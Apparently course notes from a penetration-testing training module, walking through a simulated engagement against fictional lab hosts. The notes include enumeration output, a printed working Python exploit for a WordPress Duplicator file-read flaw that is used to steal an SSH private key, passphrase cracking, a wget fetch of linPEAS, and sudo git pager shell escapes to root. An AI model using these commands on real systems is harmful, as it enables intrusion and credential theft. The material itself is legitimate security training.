# Assembling the Pieces
Now that we have introduced all the individual pieces of a penetration test, it's time to put them together in a walkthrough
+ In this Module, we will conduct a simulated penetration test inspired by real-world findings

The purpose of this Module is to act as a bridge between the PEN200 Modules and the Challenge Labs
+ One way to think about this Module is as "Challenge Lab Zero"
+ If you wish, you can start the machines and attempt to attack them on your own, and then come back and read the methodology and story described here
+ Either way, we recommend following this methodology and the mindset it produces for tackling the Challenge Labs 1-6
+ Note that to save time, in several cases we will skip steps that will not yield results for this simulation
+ However, we will call out these instances as they occur

In this scenario, the company _BEYOND Finances_ has tasked us with conducting a penetration test of their IT infrastructure
+ The client wants to determine if an attacker can breach the perimeter and get domain admin privileges in the internal _Active Directory_ (AD) environment
+ In this assessment, the client's goals for us are to obtain domain administrator privileges and access the domain controller

We should be aware that each client may have different end goals for a penetration test based on their threat level, data infrastructure, and business model
+ For example, if the client's main business is warehousing data, our goal could be to obtain that data
+ That is because a breach of this nature would cause the most significant business impact to the client
+ In most environments, domain administrator access would help us accomplish that goal, but that is not always the case

## Enumerating the Public Network
In this Learning Unit, we'll start with the first step of our penetration test, _enumeration_
+ Our fictitious client has provided us with two initial targets, which we can access via the PEN200 VPN
+ The following figure shows a network overview based on the client's information:
![[Pasted image 20240108113852.png]]
+ Figure 1 shows the two accessible machines, WEBSRV1 and MAILSRV1, as well as their corresponding IP addresses
+ **Note**: The third octet you observe in your own lab instance may differ when starting the VM group later on

In the first section, we'll begin by setting up a basic work environment for our penetration test and then enumerate MAILSRV1

### MAILSRV1
Before we begin to interact with our target to enumerate it, let's set up a work environment for this penetration test
+ This will help us to store obtained files and information in a structured way throughout the assessment
+ In later phases of a penetration test, this will prove especially helpful as we'll collect a huge amount of data and information

Structuring and isolating data and settings for multiple penetration tests can be quite the challenge
+ By reusing a Kali VM we could accidentally expose previous-client data to new networks
+ Therefore, it is recommended to use a fresh Kali image for every assessment

For this reason, let's create a **/home/kali/beyond** directory on our Kali VM
+ In it, we'll create two directories named after the two target machines we have access to at the moment
+ In addition, we'll create a **creds.txt** text file to keep track of identified valid credentials and users
```
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```

Now that we set up a work environment, we are ready to enumerate the first target machine, MAILSRV1
+ Documenting our findings is a crucial process for every penetration test
+ For this Module, we'll store results in the basic work environment we just set up
+ However, Markdown editors, such as _Obsidian_, have become quite popular for documenting findings and data in real assessments as they are application-independent and contain functions that will simplify report writing and collaboration

Let's begin with a port scan of MAILSRV1 using _Nmap_
+ A port scan is often the first active information gathering method we'll perform to get an overview of open ports and accessible services
+ In a real penetration test, we would also use passive information gathering techniques such as _Google Dorks_ and leaked password databases to obtain additional information
+ This would potentially provide us with usernames, passwords, and sensitive information

We'll use **-sV** to enable service and version detection as well as **-sC** to use Nmap's default scripts
+ In addition, we'll enter **-oN** to create an output file containing the scan results
```
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
```
+ Example
```
kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 08:53 EDT
Nmap scan report for 192.168.50.242
Host is up (0.11s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK ACL IMAP4rev1 completed CAPABILITY NAMESPACE IDLE RIGHTS=texkA0001 SORT QUOTA
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-29T12:54:00
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
```
+ Above shows that Nmap discovered eight open ports
+ Based on this information, we can establish that the target machine is a Windows system running an _IIS web server_ and a _hMailServer_ 
+ This is not surprising as the machine is named MAILSRV1 in the topology provided by the client
+ In a real-world penetration test, the hostnames may not always be as descriptive as they are in this Module

As we may not be familiar with hMailServer, we can research this application by browsing the application's web page
+ It states that hMailServer is a free, open source e-mail server for Microsoft Windows
+ To identify potential vulnerabilities in hMailServer, we can use a search engine to find CVEs and public exploits
+ However, as Nmap didn't discover a version number, we have to conduct a broader search
+ Unfortunately, the search didn't provide any meaningful results apart from some older CVEs:
![[Pasted image 20240108114427.png]]
+ Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps
+ While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems

Next, let's enumerate the IIS web server
+ First, we'll browse the web page: 
![[Pasted image 20240108114501.png]]
+ Above shows that IIS only displays the default welcome page
+ Let's try to identify directories and files by using **gobuster**
+ We'll enter **dir** to use directory enumeration mode, **-u** for the URL, **-w** for a wordlist, and **-x** for file types we want to identify
+ For this example, we'll enter **txt**, **pdf**, and **config** to identify potential documents or configuration files
+ In addition, we'll use **-o** to create an output file
```
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```
+ Example:
```
kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,pdf,config
[+] Timeout:                 10s
===============================================================
2022/09/29 11:12:27 Starting gobuster in directory enumeration mode
===============================================================

                                
===============================================================
2022/09/29 11:16:00 Finished
===============================================================
```
+ Above shows that gobuster did not identify any pages, files, or directories
+ **NOTE**: Not every enumeration technique needs to provide actionable results
	+ In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system

Let's summarize what information we obtained while enumerating MAILSRV1 so far
+ First, we launched a port scan with Nmap, which identified a running IIS web server and hMailServer
+ In addition, we established that the target is running Windows, then enumerated the running web server more closely
+ Unfortunately, this didn't provide any actionable information for us

We cannot use the mail server at this moment
+ If we identify valid credentials and targets later on in the penetration test, we could perhaps use the mail server to send a phishing email, for example

This cyclical nature of a penetration test is an important concept for us to grasp because it provides a mindset of continuously reevaluating and including new information in order to follow previously inapproachable or newly identified attack vectors

### WEBSRV1
In this section, we'll enumerate the second target machine from the client's topology, WEBSRV1
+ Based on the name, we can assume that we'll discover a web server of some kind
+ In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion
	+ Meaning, that we could perform the scans at the same time to save valuable time for the client
	+ If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings

As before, we'll begin with an **nmap** scan of the target machine
```
sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
```
+ Output:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 11:18 EDT
Nmap scan report for 192.168.50.244
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.50.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: WordPress 6.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```

The Nmap scan revealed only two open ports: 22 and 80
+ Nmap fingerprinted the services as running an _SSH_ service and _HTTP_ service on the ports, respectively

From the SSH banner, we retrieve the information that the target is running on an _Ubuntu_ Linux system
+ However, the banner provides much more detail with a bit of manual work
+ Let's copy the "OpenSSH 8.9p1 Ubuntu 3" string in to a search engine
+ The results contain a link to the Ubuntu Launchpad web page, which contains a list of OpenSSH version information mapped to specific Ubuntu releases
+ In our example, the version is mapped to _Jammy Jellyfish_, which is the version name for Ubuntu 22.04:
![[Pasted image 20240108120439.png]]

For port 22, we currently only have the option to perform a password attack
+ Because we don't have any username or password information, we should analyze other services first
+ Therefore, let's enumerate port 80 running _Apache 2.4.52_
+ We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer
	+ As this will yield no actionable results, we'll skip it 

We'll begin by browsing to the web page
+ Because the Nmap scan provided the HTTP title _BEYOND Finances_, our chances of encountering a non-default page again are high
![[Pasted image 20240108120553.png]]
+ Above shows us a basic company web page
+ However, if we review the web site, we'll notice it doesn't contain a menu bar or links to other pages
+ At first glance, there seems to be nothing actionable for us

Let’s inspect the web page’s source code to determine the technology being used by right-clicking in our browser on Kali and selecting _View Page Source_
+ For a majority of frameworks and web solutions, such as _CMS's_, we can find artifacts and string indicators in the source code
+ Let's browse through the source code to examine the page's header, comments, and links. At the bottom, we'll find some links as shown in the following figure:
![[Pasted image 20240108120653.png]]

We notice that the links contain the strings "wp-content" and "wp-includes"
+ By entering these keywords in a search engine, we can establish that the page uses WordPress

To confirm this and potentially provide more information about the technology stack in use, we can use **`whatweb`** 
```
kali@kali:~/beyond$ whatweb http://192.168.50.244                                                        
http://192.168.50.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], RedirectLocation[http://192.168.50.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.50.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```
+ The output confirms that the web page uses _WordPress 6.0.2_

While the WordPress core itself has had its share of vulnerabilities, the WordPress developers are quick to patch them
+ A review of the release history for WordPress indicates this version was released in August 2022 and at the time of writing this Module, it's the most current version

However, WordPress themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all
+ This makes plugins and themes a great target for compromise
+ Let's perform a scan on these components with _`WPScan`_, a WordPress vulnerability scanner
+ This tool attempts to determine the WordPress versions, themes, and plugins as well as their vulnerabilities

WPScan looks up component vulnerabilities in the _WordPress Vulnerability Database_, which requires an API token
+ A limited API key can be obtained for free by registering an account on the WPScan homepage
+ However, even without providing an API key, WPScan is a great tool to enumerate WordPress instances

To perform the scan without an API key, we'll provide the URL of the target for **--url**, set the plugin detection to aggressive, and specify to enumerate all popular plugins by entering **p** as an argument to **--enumerate**
+ In addition, we'll use **-o** to create an output file
```
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```
+ Output:
```
kali@kali:~/beyond$ cat websrv1/wpscan
...

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.50.244/wp-content/plugins/akismet/
 | Latest Version: 5.0
 | Last Updated: 2022-07-26T16:13:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.50.244/wp-content/plugins/classic-editor/
 | Latest Version: 1.6.2 
 | Last Updated: 2021-07-21T22:08:00.000Z
...

[+] contact-form-7
 | Location: http://192.168.50.244/wp-content/plugins/contact-form-7/
 | Latest Version: 5.6.3 (up to date)
 | Last Updated: 2022-09-01T08:48:00.000Z
...

[+] duplicator
 | Location: http://192.168.50.244/wp-content/plugins/duplicator/
 | Last Updated: 2022-09-24T17:57:00.000Z
 | Readme: http://192.168.50.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.50.244/wp-content/plugins/elementor/
 | Latest Version: 3.7.7 (up to date)
 | Last Updated: 2022-09-20T14:51:00.000Z
...

[+] wordpress-seo
 | Location: http://192.168.50.244/wp-content/plugins/wordpress-seo/
 | Latest Version: 19.7.1 (up to date)
 | Last Updated: 2022-09-20T14:10:00.000Z
...
```
+ Above shows that WPScan discovered six active plugins in the target WordPress instance: _akismet_, _classic-editor_, _contact-form-7_, _duplicator_, _elementor_, and _wordpress-seo_
+ The output also states that the Duplicator plugin version is outdated

Instead of using WPScan's vulnerability database, let's use _searchsploit_ to find possible exploits for vulnerabilities in the installed plugins
+ For a majority of the identified plugins, WPScan provided us with the detected versions
+ Because most of the plugins are up to date and no version could be detected for akismet, let's start with Duplicator:
```
kali@kali:~/beyond$ searchsploit duplicator    
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                    | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery       | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                              | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                             | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read              | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                   | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                            | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery       | php/webapps/40908.html
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The output shows that there are two exploits matching the version of the Duplicator plugin on WEBSRV1
+ One is tagged with _Metasploit_, indicating that this exploit was developed for The Metasploit Framework
+ We'll review them in the next Learning Unit

Let's summarize what information we obtained about WEBSRV1 in this section
+ We learned that the target machine is an Ubuntu 22.04 system with two open ports: 22 and 80
+ A WordPress instance runs on port 80 with various active plugins
+ A plugin named Duplicator is outdated and a SearchSploit query provided us with two vulnerability entries matching the version

## Attacking a Public Machine
In the previous Learning Unit, we gathered information on both MAILSRV1 and WEBSRV1 machines
+ Based on the enumeration results, we identified a potentially vulnerable WordPress plugin on WEBSRV1
+ In this Learning Unit, we'll attempt to exploit this vulnerable plugin and get access to the system
+ If we are successful, we'll perform privilege escalation and search the target machine for sensitive information

### Initial Foothold
In the previous Learning Unit, we used SearchSploit to find exploits for Duplicator 1.3.26
+ SearchSploit provided two exploits for this version, one of which was an exploit for Metasploit
+ Let's use SearchSploit to examine the other displayed exploit by providing the ExploitDB ID from Listing 7 to **-x**:
```
searchsploit -x 50420
```

Once entered, the information and exploit code for a directory traversal attack on Duplicator 1.3.26 are shown:
```
# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]

URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

output = re.get(url = URL)
print(output.text)
```
+ Above shows the Python code to exploit the vulnerability tracked as _CVE-2020-11738_
+ Notice that the Python script sends a GET request to a URL and adds a filename prepended with "dot dot slash" expressions

Let's copy the Python script to the **/home/kali/beyond/websrv1** directory using SearchSploit's **-m** option with the ExploitDB ID
```
kali@kali:~/beyond$ cd beyond/websrv1

kali@kali:~/beyond/websrv1$ searchsploit -m 50420
  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
File Type: ASCII text

Copied to: /home/kali/beyond/websrv1/50420.py
```

To use the script, we have to provide the URL of our target and the file we want to retrieve
+ Let's attempt to read and display the contents of **/etc/passwd** both to confirm that the target is indeed vulnerable and to obtain user account names of the system
```
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
+ We successfully obtained the contents of **/etc/passwd** and identified two user accounts, _daniela_ and _marcus_. Let's add them to **creds.txt**

As we have learned in the _Common Web Application Attacks_ Module, there are several files we can attempt to retrieve via Directory Traversal in order to obtain access to a system
+ One of the most common methods is to retrieve an SSH private key configured with permissions that are too open

In this example, we'll attempt to retrieve an SSH private key with the name **id_rsa**
+ The name will differ depending on the specified type when creating an SSH private key with _ssh-keygen_
+ For example, when choosing _ecdsa_ as the type, the resulting SSH private key is named **id_ecdsa** by default

Let's check for SSH private keys with the name **id_rsa** in the home directories of _daniela_ and _marcus_
```
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!

kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
...
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
```
+ Above shows that we have successfully retrieved the SSH private key of _daniela_ 
+ Let's save the key in a file named **id_rsa** in the current directory

Next, let's attempt to leverage this key to access WEBSRV1 as _daniela_ via SSH
+ To do so, we have to modify the file permissions as we have done several times in this course
```
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa

kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 
```
+ Above shows that the SSH private key is protected by a passphrase

Therefore, let's attempt to crack it using **ssh2john** and **john** with the **rockyou.txt** wordlist
+ After a few moments, the cracking attempt is successful as shown in the following listing
```
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash

kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa) 
...
```

Now, let's attempt to access the system again via SSH by providing the passphrase
```
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 

Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$ 
```
+ We gained access to the first target in the penetration test

Before we head into the next section, where we'll perform post-exploitation enumeration, let's add the cracked passphrase to the **creds.txt** file in the work environment directory
+ As users tend to reuse passwords and passphrases, we may need it again later in this assessment

### A Link to the Past
In the previous section, we gained access to the target machine WEBSRV1
+ In this section, we'll perform local enumeration to identify attack vectors and sensitive information and attempt to elevate our privileges

Because we often have time constraints in a penetration test, such as the duration of an assessment, let's use the _linPEAS_ automated Linux enumeration script to obtain a broad variety of information and identify any potential low hanging fruit
+ To do this, let's copy **linpeas.sh** to the **websrv1** directory and start a Python3 web server to serve it:
```
kali@kali:~/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .

kali@kali:~/beyond/websrv1$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In our SSH session, we can use **wget** to download the enumeration script:
+ In addition, we'll use **chmod** to make the script executable
```
daniela@websrv1:~$ wget http://192.168.119.5/linpeas.sh
--2022-09-30 12:26:55--  http://192.168.119.5/linpeas.sh                                                                        
Connecting to 192.168.119.5:80... connected.                                                                                    
HTTP request sent, awaiting response... 200 OK                                                                                  
Length: 826127 (807K) [text/x-sh]                                                                                               
Saving to: ‘linpeas.sh’      

linpeas.sh  100%[============================>] 806.76K   662KB/s    in 1.2s     

2022-09-30 12:26:56 (662 KB/s) - ‘linpeas.sh’ saved [826127/826127] 


daniela@websrv1:~$ chmod a+x ./linpeas.sh
```

Now, we can run the script and start the enumeration:
```
./linpeas.sh
```

Once the enumeration script has finished, let's review some of the results
+ We'll begin with the system information:
```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```
+ Above confirms that the machine is running Ubuntu 22.04 as we've identified via the OpenSSH service version

Next, we'll review the network interfaces:
```
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                          
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:265d/64 scope link 
       valid_lft forever preferred_lft forever
```
+ Above shows only one network interface apart from the loopback interface
+ This means that the target machine is not connected to the internal network and we cannot use it as a pivot point

Since we have already enumerated MAILSRV1 without any actionable results and this machine is not connected to the internal network, we have to discover sensitive information, such as credentials, to get a foothold in the internal network
+ To obtain files and data from other users and the system, we'll make elevating our privileges our priority

The following result section from linPEAS contains an interesting piece of information regarding commands executable with sudo:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                             
Matching Defaults entries for daniela on websrv1:                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```
+ Above shows that _daniela_ can run **/usr/bin/git** with sudo privileges without entering a password

Before we try to leverage this finding into privilege escalation, let's finish reviewing the linPEAS results
+ Otherwise, we may miss some crucial findings

The next interesting section is _Analyzing Wordpress Files_, which contains a clear-text password used for database access
```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

Discovering a clear-text password is always a potential high value finding
+ Let's save the password in the **creds.txt** file on our Kali machine for future use

Another interesting aspect of this finding is the path displayed starts with **`/srv/www/wordpress/`**
+ The WordPress instance is not installed in **/var/www/html** where web applications are commonly found on Debian-based Linux systems
+ While this is not an actionable result, we should keep it in mind for future steps

Let's continue reviewing the linPEAS results
+ In the _Analyzing Github Files_ section, we'll find that the WordPress directory is a _Git repository_:
```
╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                                
drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```
+ We can assume that Git is used as the version control system for the WordPress instance
+ Reviewing the commits of the Git repository may allow us to identify changes in configuration data and sensitive information such as passwords

The directory is owned by _root_ and is not readable by other users as shown above
+ However, we can leverage sudo to use Git commands in a privileged context and therefore search the repository for sensitive information

For now, let's skip the rest of the linPEAS output and summarize what information and potential privilege escalation vectors we've gathered so far
+ WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network
+ The _sudoers_ file contains an entry allowing _daniela_ to run **/usr/bin/git** with elevated privileges without providing a password
+ In addition, we learned that the WordPress directory is a Git repository
+ Finally, we obtained a clear-text password in the database connection settings for WordPress

Based on this information we can define three potential privilege escalation vectors:
- Abuse sudo command **/usr/bin/git**
- Use sudo to search the Git repository
- Attempt to access other users with the WordPress database password

The most promising vector at the moment is to abuse the sudo command **/usr/bin/git** because we don't have to enter a password
+ Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges
+ To find potential abuses when a binary such as _git_ is allowed to run with sudo, we can consult _GTFOBins_
+ On this page, we enter **git** in the search bar and select it in the list
	+ Then, let's scroll down until we reach the _Sudo_ section:
![[Pasted image 20240108123606.png]]

Above shows two of the five potential abuse vectors to elevate privileges via git with sudo privileges
+ Let's try the first one by setting an environment variable that executes when launching the help menu
```
sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
```
+ Output:
```
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```
+ Unfortunately, the output states that we are not allowed to set an environment variable

Next, let's try the second abuse vector
+ This command opens the help menu in the default _pager_
+ On Linux, one of the most popular pagers is _less_
+ The commands to navigate the pager are similar to _vi_ and can be used to execute code in the context of the user account that launched the pager
```
sudo git -p help config
```
+ To execute code through the pager, we can enter **!** followed by a command or path to an executable file
+ We can enter a path to a shell
	+ Let's use **/bin/bash** to obtain an interactive shell:
```
...
       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root
```
+ We successfully elevated our privileges on WEBSRV1

Armed with _root_ privileges, we'll continue enumerating the system
+ Before doing so, let's search the Git repository for sensitive information first

To do so, we'll change our current directory to the Git repository
+ Then, we can use **git status** to display the state of the Git working directory and **git log** to show the commit history 
```
root@websrv1:/home/daniela# cd /srv/www/wordpress/

root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean

root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
```
+ Above shows that there are two commits in the repository
+ One is labeled as _initial commit_ and one as _Removed staging script and internal network access_
+ That's quite interesting as it indicates that the machine previously had access to the internal network
+ In addition, the first commit may contain a staging script that was removed

We could switch back to a specific commit by using **git checkout** and a commit hash
+ However, this could break the functionality of the web application and potentially disrupt the client's day to day operations

A better approach is to use **git show**, which shows differences between commits
+ In our case, we'll supply the commit hash of the latest commit to the command as we are interested in the changes after the first commit
```
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

